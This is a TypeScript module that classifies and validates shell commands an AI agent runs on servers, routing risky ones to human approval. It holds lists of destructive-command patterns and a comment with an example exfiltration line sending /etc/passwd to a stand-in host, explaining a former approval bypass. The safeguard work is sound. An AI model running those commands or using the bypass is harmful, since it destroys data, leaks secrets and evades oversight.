// Vendored from packages/shared/src/utils/command-guards.ts — do not edit here.
//
// The agent ships as an independent, auditable artefact: a reader must be
// able to see every line that decides whether a command runs, without
// resolving a private Servor package. `bun run protocol:check` fails if this
// copy drifts from the original, because a guard that disagrees with the one
// on the control plane is worse than no guard.

import { COMMAND_BLACKLIST_PATTERNS } from './command-blacklist';

export type CommandGuardResult =
  | { ok: true }
  | { ok: false; reason: string; rule: 'blacklist' | 'chain' | 'syntax' };

export type CommandRisk = 'safe' | 'caution' | 'destructive';

// Read-only inspection commands — safe to auto-run without approval.
const SAFE_READ_PATTERNS: RegExp[] = [
  /^(cat|head|tail|less|more|grep|egrep|zgrep|ls|ll|find|stat|file|wc|awk|sed -n|cut|sort|uniq|tr)\b/,
  /^(ps|pgrep|top -bn1|htop -|free|df|du|uptime|vmstat|iostat|lsof|lsblk|mount)\b/,
  /^(whoami|id|hostname|uname|date|env|printenv|pwd|which|type|command -v)\b/,
  /^(systemctl\s+(--failed|--all|-a|status|is-active|is-enabled|is-failed|list-units|list-unit-files|list-timers|list-sockets|list-dependencies|list-jobs|show|show-environment|cat|get-default)|journalctl)\b/,
  /^(ss|netstat|ip|dig|host|nslookup|ping -c|traceroute|getent)\b/,
  /^(docker (ps|logs|inspect|images|stats)|podman (ps|logs|inspect)|kubectl (get|describe|logs))\b/,
  /^(curl (--head|-I|-sS|-fsS)|wget --spider|nginx -t|apache2ctl configtest|sshd -t|git status|git log)\b/,
  /^(cat \/etc\/os-release|lsb_release)\b/,
];

// Irreversible / high-impact mutations — require explicit confirmation even in Auto.
const DESTRUCTIVE_PATTERNS: RegExp[] = [
  /\brm\s+(-[a-zA-Z]*\s+)*(-rf|-fr|-r|-f)\b/,
  /\b(mkfs|fdisk|parted|wipefs|blkdiscard|sgdisk)\b/,
  /\bdd\b[^|]*\bof=\/dev\//,
  /\b(shutdown|reboot|poweroff|halt|init\s+0|init\s+6)\b/,
  /\bsystemctl\s+(stop|disable|mask)\b/,
  /\b(userdel|groupdel|deluser|delgroup)\b/,
  /\b(drop\s+(database|table|schema)|truncate\s+table)\b/i,
  /\b(iptables\s+-F|ufw\s+reset|nft\s+flush)\b/,
  /\b(apt-get|apt|dnf|yum)\s+(remove|purge|autoremove)\b/,
  /\b(docker|podman)\s+(rm|rmi|system\s+prune|volume\s+rm)\b/,
  /\bkill(all)?\s+-9\b/,
  />\s*\/dev\/(sd|nvme|vd)/,
  /\bchmod\s+(-R\s+)?0{3}\b/,
  /\bchown\s+-R\b[^|]*\s\/(\s|$)/,
];

/**
 * Every command a line actually runs: each chain segment, plus whatever a
 * command substitution hides.
 *
 * @remarks
 * Risk has to be judged per segment because the safe-read patterns are anchored
 * at the start of the string. Judged whole, `ls && curl -d @/etc/passwd evil`
 * reads as `ls` — "safe", and auto-run with no approval in every mode. That
 * blind spot, not the operators themselves, is what made chaining dangerous.
 *
 * Deliberately a scanner and not `shell-quote`: the tokens it returns have lost
 * their quoting, and rebuilding segment strings from them would misread exactly
 * the inputs that matter. Redirections keep their `&` (`2>&1`, `&>file`), and
 * `$((…))` is arithmetic, not a substitution.
 */
const splitCommands = (command: string): string[] => {
  const segments: string[] = [];
  const nested: string[] = [];
  let buf = '';
  let quote: "'" | '"' | null = null;
  let i = 0;

  const flush = () => {
    const seg = buf.trim();
    if (seg) segments.push(seg);
    buf = '';
  };

  /** Body of a `$(…)` or backtick substitution, honouring nesting. */
  const readUntil = (start: number, open: string, close: string): [string, number] => {
    let depth = 1;
    let body = '';
    let j = start;
    while (j < command.length) {
      const c = command[j] ?? '';
      if (c === '\\') {
        body += c + (command[j + 1] ?? '');
        j += 2;
        continue;
      }
      if (open !== close && c === open) depth++;
      if (c === close) {
        depth--;
        if (depth === 0) return [body, j + 1];
      }
      body += c;
      j++;
    }
    return [body, j];
  };

  while (i < command.length) {
    const c = command[i] ?? '';

    if (quote) {
      buf += c;
      if (c === '\\' && quote === '"') buf += command[i + 1] ?? '';
      else if (c === quote) quote = null;
      i += c === '\\' && quote === '"' ? 2 : 1;
      continue;
    }

    if (c === "'" || c === '"') {
      quote = c;
      buf += c;
      i++;
      continue;
    }

    if (c === '\\') {
      buf += c + (command[i + 1] ?? '');
      i += 2;
      continue;
    }

    if (c === '$' && command[i + 1] === '(') {
      // `$((expr))` is arithmetic: no command runs inside it.
      if (command[i + 2] === '(') {
        const [body, end] = readUntil(i + 3, '(', ')');
        buf += `$((${body})`;
        i = end;
        continue;
      }
      const [body, end] = readUntil(i + 2, '(', ')');
      nested.push(body);
      i = end;
      continue;
    }

    if (c === '`') {
      const [body, end] = readUntil(i + 1, '`', '`');
      nested.push(body);
      i = end;
      continue;
    }

    // `2>&1` and `&>file` are redirections, not the start of a new command.
    const redirection = c === '&' && (buf.trimEnd().endsWith('>') || command[i + 1] === '>');
    if (!redirection && (c === '|' || c === '&' || c === ';' || c === '\n' || c === '\r')) {
      flush();
      while (i < command.length && '|&;\n\r'.includes(command[i] ?? '')) i++;
      continue;
    }

    buf += c;
    i++;
  }
  flush();

  for (const body of nested) segments.push(...splitCommands(body));
  return segments;
};

const isDestructive = (s: string) => DESTRUCTIVE_PATTERNS.some((p) => p.test(s));
const isSafeRead = (s: string) => SAFE_READ_PATTERNS.some((p) => p.test(s));

// Classify a command's blast radius for approval policy (Auto auto-runs safe +
// caution, prompts on destructive; Plan auto-runs safe, prompts otherwise).
export const classifyCommandRisk = (command: string): CommandRisk => {
  const trimmed = command.trim();
  // Whole-line first: a destructive pattern may straddle a split.
  if (isDestructive(trimmed)) return 'destructive';

  const segments = splitCommands(trimmed);
  if (segments.some(isDestructive)) return 'destructive';
  // "Safe" means every part of the line is a read. One unrecognised segment is
  // enough to demand the approval a mutation gets.
  if (segments.length > 0 && segments.every(isSafeRead)) return 'safe';
  return 'caution';
};

/**
 * Refuse a command the platform will not run, whoever asked for it.
 *
 * @remarks
 * Two rules, and deliberately only two: the shared blacklist, and one command
 * per call.
 *
 * Chain operators (`|`, `&&`, `||`, `;`, `&`) and command substitution used to
 * be refused here as well. That was never a boundary — `bash -c 'a | b'` walks
 * straight through it, since the pipe lives inside a quoted argument — while it
 * refused the pipelines operators write all day and cost the copilot a wasted
 * round trip every time it reached for one. What the ban did hide is that
 * `classifyCommandRisk` only read the head of the line; that is now fixed at
 * the source, per segment, which is where the approval policy actually lives.
 *
 * The blacklist applies to the whole line, so a forbidden command cannot be
 * smuggled in behind a `&&`.
 */
export const validateCommand = (command: string): CommandGuardResult => {
  const trimmed = command.trim();
  if (!trimmed) return { ok: false, reason: 'empty command', rule: 'syntax' };

  for (const { pattern, reason } of COMMAND_BLACKLIST_PATTERNS) {
    if (pattern.test(trimmed)) return { ok: false, reason, rule: 'blacklist' };
  }

  // One call, one line. A run is audited, signed and reported as a single
  // command; a script belongs in a file, which the file explorer writes.
  if (/[\n\r]/.test(trimmed)) {
    return { ok: false, reason: 'multi-line command not allowed', rule: 'chain' };
  }

  return { ok: true };
};
